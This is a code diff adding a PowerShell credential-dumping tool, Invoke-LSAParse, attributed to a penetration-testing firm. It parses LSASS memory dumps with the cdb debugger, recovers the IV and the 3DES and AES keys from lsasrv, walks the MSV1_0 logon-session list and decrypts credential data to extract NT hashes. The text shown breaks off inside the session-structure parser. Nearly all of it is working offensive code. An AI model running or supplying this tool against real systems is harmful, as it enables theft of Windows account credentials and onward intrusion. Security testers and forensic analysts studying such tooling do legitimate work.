@@ -1,0 +1,1910 @@
+<#
+        File: Invoke-LSAParse.ps1
+        Author: Sebastian Hölzle, SySS GmbH - 2021
+        Version: 0.9
+        Description: Invoke-LSAParse is a tool to extract sensitive data from memory dumps of the LSASS process.
+        License: BSD 3-Clause
+        Required Dependencies: None
+        Optional Dependencies: None
+#>
+Function Invoke-LSAParse
+    {
+    Param(
+        $PathToDMP,
+        $Verbose = $false
+    )
+
+    <#
+    .SYNOPSIS
+    Analyzes an Memory Dump of the LSA Process and extracts then NT Hashes of the logged on identities. 
+    
+    .PARAMETER PathToDmp
+    Full Path to DMP file
+
+    .PARAMETER Verbose
+    Switch to increase verbosity - default value $false
+
+    .Description
+    The extraction of the information from the memory dump is done only by powershell with the support of the Microsoft signed tool cdb.exe. The script uses for the purpose of parsing the dmp file the cdb.exe which is encoded within the script itself.
+    At the start of the script the debugger is written to the temp directory of the user which executes the script.
+    
+    .OUTPUTS
+    Object which contains the username and the extracted NT Hash
+    
+    .EXAMPLE
+    Invoke-LSAParse -PathtoDmp C:\temp\lsa.dmp -Verbose $true
+    Analyzes the  
+    .LINK
+    
+    #>
+
+    function Get-Crypto
+    {
+    Param(
+        $keypattern,
+        $offset,
+        $AESOffset,
+        $DESoffset,
+        $PathToDebugger,
+        $PathToDMP
+    )
+
+    $DESKey = $null 
+    $AESKey = $Null 
+    $IV = $null
+
+    $RawModuleLSASRV = Run-Debugger -PathToCDP $PathToDebugger -PathToDMP $PathToDMP -Command "lm m lsasrv"
+    $startModuleLSASRV = ($RawModuleLSASRV -match "lsasrv")[1].trim().substring(0,18)
+    $RawPattern = Run-Debugger -PathToCDP $PathToDebugger -PathToDMP $PathToDMP -Command  ("s -b $startModuleLSASRV L400000 $keypattern")
+    $PatternAddress = ($RawPattern |  where {$_ -match $keypattern.Substring(0,20) -and $_ -notlike "*:*"}).trim().substring(0,18)
+    $PointerAddress = "{0:x8}" -f ([convert]::toint64(($PatternAddress.Split('`')[1]).trim(),16) + $offset)
+    $RawIVPointer = Run-Debugger -PathToCDP $PathToDebugger -PathToDMP $PathToDMP -Command  ("dd " + ($PatternAddress.Split('`')[0] + '`' + $PointerAddress))
+    $IVPointer = ($RawIVPointer -match ($PatternAddress.Split('`')[0] + '`' + $PointerAddress))[1].trim().substring(19,8)
+    $IVAddress = "{0:x8}" -f ([convert]::toint64(($PointerAddress).trim(),16) + [convert]::toint64(($IVPointer).trim(),16) + 4)
+    $RawIV = Run-Debugger -PathToCDP $PathToDebugger -PathToDMP $PathToDMP -Command  ("dd " + ($PatternAddress.Split('`')[0] + '`' + $IVAddress) + " L4")
+    $IVLitEd = ($RawIV -match ($PatternAddress.Split('`')[0] + '`' + $IVAddress))[1].trim().split("  ")[2,3,4,5]
+    $IV = $null
+    $IVLitEd | foreach {$IV += Rev-LitEdian -InputStr $_}
+    $DESPointerAddress = "{0:x8}" -f ([convert]::toint64(($PatternAddress.Split('`')[1]).trim(),16) + $DESoffset)
+    $RawDesHandlePointer = Run-Debugger -PathToCDP $PathToDebugger -PathToDMP $PathToDMP -Command ("dd " + ($PatternAddress.Split('`')[0] + '`' + $DESPointerAddress))
+    $DESHandlePointer = ($RawDesHandlePointer -match ($PatternAddress.Split('`')[0] + '`' + $DESPointerAddress))[1].trim().split("  ")[2]
+    $DESHandleAddress = "{0:x8}" -f ([convert]::toint64(($DESPointerAddress).trim(),16) + [convert]::toint64(($DESHandlePointer).trim(),16) + 4)
+    $RawDESHandle = Run-Debugger -PathToCDP $PathToDebugger -PathToDMP $PathToDMP -Command ("dd " + ($PatternAddress.Split('`')[0] + '`' + $DESHandleAddress) + " L2")
+    $DESHandleLitEd = ($RawDESHandle -match ($PatternAddress.Split('`')[0] + '`' + $DESHandleAddress))[1].trim().split("  ")[2,3]
+    $DESHandle = $DESHandleLitEd[1] + ("{0:x8}" -f ([convert]::toint64(($DESHandleLitEd[0]).trim(),16) + 80))
+    $RawDESKey = Run-Debugger -PathToCDP $PathToDebugger -PathToDMP $PathToDMP -Command ("dd " + $DESHandle + " LA")
+    $DESKey = $null
+    ($RawDESKey -match ($DESHandle.Substring(0,8)+ '`')) | foreach{$_.split("  ") | foreach{if($_ -notlike "*000000*" -and $_.length -eq 8){$DESKey += (Rev-LitEdian -InputStr $_)}}}
+    $AESPointerAddress = "{0:x8}" -f ([convert]::toint64(($PatternAddress.Split('`')[1]).trim(),16) + $AESoffset)
+    $RawAESHandlePointer = Run-Debugger -PathToCDP $PathToDebugger -PathToDMP $PathToDMP -Command ("dd " + ($PatternAddress.Split('`')[0] + '`' + $AESPointerAddress))
+    $AESHandlePointer = ($RawAESHandlePointer -match ($PatternAddress.Split('`')[0] + '`' + $AESPointerAddress))[1].trim().split("  ")[2]
+    $AESHandleAddress = "{0:x8}" -f ([convert]::toint64(($AESPointerAddress).trim(),16) + [convert]::toint64(($AESHandlePointer).trim(),16) + 4)
+    $RawAESHandleLitEd = Run-Debugger -PathToCDP $PathToDebugger -PathToDMP $PathToDMP -Command ("dd " + ($PatternAddress.Split('`')[0] + '`' + $AESHandleAddress) + " L2")
+    $AESHandleLitEd = ($RawAESHandleLitEd -match ($PatternAddress.Split('`')[0] + '`' + $AESHandleAddress))[1].trim().split("  ")[2,3]
+    $AESHandle = $AESHandleLitEd[1] + ("{0:x8}" -f ([convert]::toint64(($AESHandleLitEd[0]).trim(),16) + 80))
+    $RawAESKey = Run-Debugger -PathToCDP $PathToDebugger -PathToDMP $PathToDMP -Command ("dd " + $AESHandle + " L8")
+    $AryAESKey = $RawAESKey -match ($AESHandle.Substring(0,8) + '`') | foreach{$_.split("  ")} | where{$_.length -eq 8 -and $_ -notlike"000000*"}
+    $AESKey = $null
+    $AryAESKey | foreach{$AESKey += (Rev-LitEdian $_)}
+    
+    return $IV, $DESKey, $AESKey, $startModuleLSASRV.Replace('`','')
+    }
+
+    function Get-CredEntries
+    {
+    Param(
+        $CredentialPattern,
+        $ModuleLSASVRStart,
+        $MSVOffset,
+        $MSVOffsetFirstEntry,
+        $PathToDebugger,
+        $PathToDMP
+    )
+    $AddressOfFirstEntry = $null
+
+    $RawPattern = Run-Debugger -PathToCDP $PathToDebugger -PathToDMP $PathToDMP -Command  "s -b $ModuleLSASVRStart L4000000 $CredentialPattern"
+    $MSVPatternAddress = ($RawPattern |  where {$_ -match $CredentialPattern.Substring(0,20) -and $_ -notlike "*:*"}).trim().substring(0,18)
+    $MSVPointerAddress = "{0:x8}" -f ([convert]::toint64(($MSVPatternAddress.Split('`')[1]).trim(),16) + $MSVOffset)  
+
+    $RawMSVPointer = Run-Debugger -PathToCDP $PathToDebugger -PathToDMP $PathToDMP -Command  ("dd " + ($MSVPatternAddress.split('`')[0] + $MSVPointerAddress) + " L1")
+    $MSVPointer = ($RawMSVPointer -match ($MSVPatternAddress.split('`')[0] + '`' + $MSVPointerAddress)).split(" ")[2]
+
+    $SessionCountPointer = "{0:x8}" -f ([convert]::toint64(($MSVPatternAddress.Split('`')[1]).trim(),16) + [convert]::toint64($MSVPointer.trim(),16) + 4)
+
+    #### Session Start #####
+    $MSVListEntryPointerAddress = "{0:x8}" -f ([convert]::toint64(($MSVPatternAddress.Split('`')[1]).trim(),16) + $MSVOffsetFirstEntry)
+    $RawMSVListEntryPointer = Run-Debugger -PathToCDP $PathToDebugger -PathToDMP $PathToDMP -Command  ("dd " + ($MSVPatternAddress.split('`')[0] + $MSVListEntryPointerAddress) + " L1")
+    $MSVListEntryPointer = ($RawMSVListEntryPointer -match ($MSVPatternAddress.split('`')[0] + '`' + $MSVListEntryPointerAddress)).split(" ")[2]
+    $MSVListEntryAddress = "{0:x8}" -f ([convert]::toint64(($MSVListEntryPointerAddress).trim(),16) + [convert]::toint64($MSVListEntryPointer.trim(),16) + 4)
+    $RawAddressOfFirstEntry = Run-Debugger -PathToCDP $PathToDebugger -PathToDMP $PathToDMP -Command  ("dd "+ ($MSVPatternAddress.split('`')[0] + $MSVListEntryAddress))
+    
+    $AddressArray = ($RawAddressOfFirstEntry -match ($MSVPatternAddress.split('`')[0] + '`'))
+    $FinalAddresses = @()
+    foreach($Line in $AddressArray)
+        {
+        $RawAddresses = @()
+        $Segments = $Line.split(" ")
+        foreach($Segment in $Segments)
+            {
+            if($Segment.Length -eq 8 -and $Segment -ne "00000000")
+                {
+                $RawAddresses += $Segment
+                $Segment = $null
+                }
+            }
+        $Segments = $Null
+        $FinalAddresses += $RawAddresses[-3] + $RawAddresses[-2]
+        $FinalAddresses += $RawAddresses[-1] + $RawAddresses[0]
+        $RawAddresses = @()
+        }
+
+
+    return $FinalAddresses
+    }
+
+    Function Convert-HexToByteArray {
+
+    [cmdletbinding()]
+
+    param(
+        [parameter(Mandatory=$true)]
+        [String]
+        $HexString
+    )
+
+    $Bytes = [byte[]]::new($HexString.Length / 2)
+
+    For($i=0; $i -lt $HexString.Length; $i+=2){
+        $Bytes[$i/2] = [convert]::ToByte($HexString.Substring($i, 2), 16)
+    }
+
+    $Bytes
+    }
+
+    Function Convert-ByteArrayToHex {
+
+    [cmdletbinding()]
+
+    param(
+        [parameter(Mandatory=$true)]
+        [Byte[]]
+        $Bytes
+    )
+
+    $HexString = [System.Text.StringBuilder]::new($Bytes.Length * 2)
+
+    ForEach($byte in $Bytes){
+        $HexString.AppendFormat("{0:x2}", $byte) | Out-Null
+    }
+
+    $HexString.ToString()
+    }
+
+    function Rev-LitEdian
+    {
+    Param(
+        [string]$InputStr
+    )
+    #$InputStr = "a0b21cf4f87f0000"
+    $result=$null
+    #Length check
+    $GoodLength = $InputStr.Length % 2
+    if($GoodLength -eq 0)
+        {
+        for($i=2;$i -le ($InputStr.Length);$i=$i+2)
+            {
+            $result += $InputStr.Substring($InputStr.Length-$i,2)
+            }
+        }
+    else
+        {
+        Write-Host "Length not good"
+        }
+
+    return $result
+    }
+
+    Function Get-LUID
+    {
+    Param(
+        [string]$InputStr
+    )
+    
+
+    $LowPart = Rev-LitEdian $InputStr.Substring(0,8)
+    $HighPart= Rev-LitEdian $InputStr.Substring(8,8)
+    $HighPart = ("{0:x}" -f ([convert]::toint64($HighPart,16) -shl 32).tostring().PadLeft(8,"0"))
+    $result= $HighPart + $LowPart
+    return $result
+    }
+
+    Function Get-Align
+    {
+    Param(
+    [String]$BaseAddress,
+    [String]$BytestoAdd,
+    [string]$AllignmentOffset
+    )
+
+    $result = $null
+    if($AllignmentOffset -lt 0)
+        {
+        $Allignment = 8
+        }
+    else
+        {
+        $Allignment = $AllignmentOffset
+        }
+
+    $CurrentAddress = ([convert]::toint64($BaseAddress,16) + $BytestoAdd)
+    
+    $AlOffset = $CurrentAddress % $Allignment
+
+    if($AlOffset -eq 0)
+        {
+        $result = 0
+        return $result
+        }
+    else
+        {
+        $result = ($Allignment - $AlOffset) % $Allignment
+        return $result
+        }
+
+    }
+
+    Function Get-CharsFromHex
+    {
+    Param(
+        $HexString
+    )
+   
+    for($i = 0;$i -lt $HexString.Length;$i+=2)
+        {
+        $Part = $HexString.Substring($i,2)
+        if($Part -ne "00")
+            {
+            $Chars += [char]([convert]::toint16($Part,16))
+            }
+        $Part = $null
+        }
+    return $Chars
+
+    }
+
+    function Search-Binary {
+    [cmdletbinding()]
+    Param (
+        [parameter(ValueFromPipeline=$True,ValueFromPipelineByPropertyName=$True,Mandatory=$True)]
+        $ByteArray,
+        [parameter(ValueFromPipeline=$True,ValueFromPipelineByPropertyName=$True,Mandatory=$True)]
+        [Byte[]]$Pattern,
+        [parameter(ValueFromPipeline=$True,ValueFromPipelineByPropertyName=$True)]
+        [Switch]$First
+    )
+    
+    #  Original method function originally by Tommaso Belluzzo
+    #  https://stackoverflow.com/questions/16252518/boyer-moore-horspool-algorithm-for-all-matches-find-byte-array-inside-byte-arra
+    $MethodDefinition = @'
+        public static System.Collections.Generic.List<Int64> IndexesOf(Byte[] ByteArray, Byte[] pattern, bool first = false)
+        {
+            if (ByteArray == null)
+                throw new ArgumentNullException("ByteArray");
+            if (pattern == null)
+                throw new ArgumentNullException("pattern");
+            Int64 ByteArrayLength = ByteArray.LongLength;
+            Int64 patternLength = pattern.LongLength;
+            Int64 searchLength = ByteArrayLength - patternLength;
+            if ((ByteArrayLength == 0) || (patternLength == 0) || (patternLength > ByteArrayLength))
+                return (new System.Collections.Generic.List<Int64>());
+            Int64[] badCharacters = new Int64[256];
+            for (Int64 i = 0; i < 256; ++i)
+                badCharacters[i] = patternLength;
+            Int64 lastPatternByte = patternLength - 1;
+            for (Int64 i = 0; i < lastPatternByte; ++i)
+                badCharacters[pattern[i]] = lastPatternByte - i;
+            // Beginning
+            Int64 index = 0;
+            System.Collections.Generic.List<Int64> indexes = new System.Collections.Generic.List<Int64>();
+            while (index <= searchLength)
+            {
+                for (Int64 i = lastPatternByte; ByteArray[(index + i)] == pattern[i]; --i)
+                {
+                    if (i == 0)
+                    {
+                        indexes.Add(index);
+                        if (first)
+                            return indexes;
+                        break;
+                    }
+                }
+                index += badCharacters[ByteArray[(index + lastPatternByte)]];
+            }
+            return indexes;
+        }
+'@
+
+    if (-not ([System.Management.Automation.PSTypeName]'Random.Search').Type) {
+        Add-Type -MemberDefinition $MethodDefinition -Name 'Search' -Namespace 'Random' | Out-Null
+    }
+    return [Random.Search]::IndexesOf($ByteArray, $Pattern, $First)
+    }
+
+    function Run-Debugger
+    {
+    Param(
+        $PathToCDP,
+        $PathToDMP,
+        $Command
+    )
+
+    $result = &$PathToCDP -z $PathToDMP -c "$Command ;Q"
+    return $result
+    }
+
+    function Get-Pattern
+    {
+    Param(
+        $Address,
+        $CdbProgramPath,
+        $DMPPath
+    )
+
+    $Pattern = $null 
+    $BefLitEndian = $null 
+    $Raw = $null 
+    $RawMemorydata = $null 
+    $CMD = "dd $Address"
+    $Result = $null
+    $Raw = Run-Debugger -PathToCDP $CdbProgramPath -PathToDMP $DMPPath -Command $CMD
+    $length = $null
+    $RawMemorydata = $Raw  -like ($Address.Substring(0,8)) + "*"
+
+    foreach($Data in $RawMemorydata)
+        {
+        $BefLitEndian =$Data.Substring(19,$Data.Length-19).split(" ")
+        
+        Foreach($Segment in $BefLitEndian)
+            {
+             if($Segment.length -eq 8)
+                {
+                $Pattern += Rev-LitEdian $Segment
+                }
+            
+            }
+        }
+    
+    $binaryReader = New-Object System.IO.BinaryReader([System.IO.File]::Open($DMPPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite))
+    $length =  $binaryReader.BaseStream.Length
+    [Byte[]] $byteArray = $binaryReader.ReadBytes($length)
+
+    $Result = Search-Binary -ByteArray $byteArray -Pattern (Convert-HexToByteArray -HexString $Pattern) -First 
+
+
+
+    return $Result
+    }
+
+    function Get-DecCreds
+    {
+    Param(
+        $DESKey,
+        $IV,
+        $EncString
+    )
+
+    $ByteDESKey = Convert-HexToByteArray -HexString $DESKey
+    $ByteIV = Convert-HexToByteArray -HexString $IV
+    $ByteData = Convert-HexToByteArray -HexString $EncString
+    $MyBuffer = [System.Byte[]]::new($ByteData.Length)
+
+    $msDecrypt = [System.IO.MemoryStream]::new($ByteData)
+    $msDecrypt.Position = 0
+    $dessp = [System.Security.Cryptography.TripleDESCryptoServiceProvider]::new()
+    $dessp.Key = $ByteDESKey
+    $dessp.Padding = "None"
+    $dessp.IV = $ByteIV[0..7]
+    $Decrypt = $dessp.CreateDecryptor($ByteDESKey,$ByteIV[0..7])
+    $cs = [System.Security.Cryptography.CryptoStream]::new($msDecrypt,$Decrypt,[System.Security.Cryptography.CryptoStreamMode]::Read)
+    $cs.Read($MyBuffer, 0, $MyBuffer.Length) | Out-Null
+    $DecString =  ([System.BitConverter]::ToString($MyBuffer)).replace('-','')
+    
+    return $DecString
+    }
+
+    function Parse-KIWI_MSV1_0_LIST_63
+    {
+    Param(
+        [int64]$InitialPosition,
+        $StartAddress,
+        $DESKey,
+        $IV,
+        $PathToCDP, 
+        $PathToDMP
+    )
+
+    $BytesAdded = 0
+
+    $KIWI_MSV1_0_LIST_63 = New-Object -Type psobject -Property (@{
+            "flink" = $null
+            "blink" = $null
+            "unk0" = $null
+            "unk1" = $null
+            "unk2" = $null
+            "unk3" = $null
+            "unk4" = $null
+            "unk5" = $null
+            "hSemaphore6" = $null
+            "unk7" = $null
+            "hSemaphore8" = $null
+            "unk9" = $null
+            "unk10" = $null
+            "unk11" = $null
+            "unk12" = $null
+            "unk13" = $null
+            "LocallyUniqueIdentifier" = $null
+            "SecondaryLocallyUniqueIdentifier" = $null
+            "username" = $null
+            "Domaine" = $null
+            "unk14" = $null
+            "Type" = $null
+            "PSID" = $null
+            "LogonType" = $null
+            "unk18" = $null
+            "logontime" = $null
+            "LogonServer" = $null
+            "CredentialListPt" = $null
+            "PKIWI_MSV1_0_CREDENTIAL_LIST" = $null
+            "unk19" = $null
+            "unk20" = $null
+            "unk21" = $null
+            "unk22" = $null
+            "unk23" = $null
+            "unk24" = $null
+            "unk25" = $null
+            "unk26" = $null
+            "unk27" = $null
+            "unk28" = $null
+            "unk29" = $null
+            "CredentialManager" = $null
+            })
+
+    $username = New-Object -Type psobject -Property (@{
+                "Position" = $Null
+                "Length" =  $null # 2 Bytes
+                "MaxLength" = $null # 2 Bytes
+                "Buffer" = $null # 8 Bytes
+                })
+
+    $Domaine = New-Object -Type psobject -Property (@{
+                "Position" = $Null
+                "Length" =  $null # 2 Bytes
+                "MaxLength" = $null # 2 Bytes
+                "Buffer" = $null # 8 Bytes
+                })
+
+    $Type = New-Object -Type psobject -Property (@{
+                "Position" = $Null
+                "Length" =  $null # 2 Bytes
+                "MaxLength" = $null # 2 Bytes
+                "Buffer" = $null # 8 Bytes
+                })
+
+    $LogonServer = New-Object -Type psobject -Property (@{
+                "Position" = $Null
+                "Length" =  $null # 2 Bytes
+                "MaxLength" = $null # 2 Bytes
+                "Buffer" = $null # 8 Bytes
+                })
+
+    $PSID = $null
+
+    $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
+    $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
+    $fileReader.BaseStream.Position=$InitialPosition
+    $flink = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = 8
+
+    $blink = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk0 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk1 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+    $unk2 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk3 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')#ULONG(reader).value - 4 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk4 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')#ULONG(reader).value - 4 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk5 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')#ULONG(reader).value - 4 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+    
+    $hSemaphore6 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #HANDLE(reader).value - evtl. 4 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk7 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $hSemaphore8 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #HANDLE(reader).value - evtl. 4 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk9 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk10 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk11 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') #ULONG(reader).value - 4 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk12 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') #ULONG(reader).value - 4 Bytes
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $unk13 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $LocallyUniqueIdentifier = Get-LUID ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $SecondaryLocallyUniqueIdentifier = Get-LUID ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $InitialPosition=$InitialPosition+12;$fileReader.BaseStream.Position=($InitialPosition)# # 12 Bytes #waza 
+    $BytesAdded = $BytesAdded + 12
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+
+    $username.Position = $InitialPosition
+    $username.Length = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $username.MaxLength = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+
+    $username.Buffer = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $Domaine.Position = $InitialPosition
+    $Domaine.Length = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $Domaine.MaxLength = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+
+    $Domaine.Buffer = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk14 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $unk15 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $Type.Position = $InitialPosition
+    $Type.Length = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $Type.MaxLength = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+2;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 2
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+
+    $Type.Buffer = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $PSID = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') #PVOID(reader).value - 8 Bytes
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+    
+    $LogonType = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded)
+
+    $unk18 = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+    $InitialPosition=$InitialPosition+8;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 8
+
+    $session = Rev-LitEdian -InputStr ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
+    $InitialPosition=$InitialPosition+4;$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + 4
+
+    $InitialPosition=$InitialPosition+(Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded -AllignmentOffset 8);$fileReader.BaseStream.Position=($InitialPosition)
+    $BytesAdded = $BytesAdded + (Get-Align -BaseAddress $StartAddress -BytestoAdd $BytesAdded -AllignmentOffset 8)
